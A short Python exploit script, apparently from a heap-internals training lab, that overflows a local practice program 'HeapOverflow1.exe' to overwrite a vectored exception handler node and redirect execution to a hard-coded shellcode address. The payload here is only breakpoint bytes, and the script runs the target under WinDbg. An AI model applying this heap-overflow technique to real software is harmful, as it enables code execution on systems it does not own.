import os
 
# _vectored_exception_node
exploit = ("\xcc" * 284)
 
# ECX pointer to next _VECTORED_EXCEPTION_NODE = 0x77fc3210 - 0x04
# due to second MOV writes to EAX+4 == 0x77fc320c
exploit += ("\x0c\x32\xfc\x77") # ECX
 
# EAX ptr to shellcode located at 0012ff40 - 0x8 == 0012ff38
exploit += ("\x38\xff\x12") # EAX - we don't need the null byte
 
os.system('"C:\\windbg.lnk" C:\\Documents and Settings\\Administrator\\Desktop\\Heap Internals\\HeapInternals\\Debug\\HeapOverflow1.exe ' + exploit)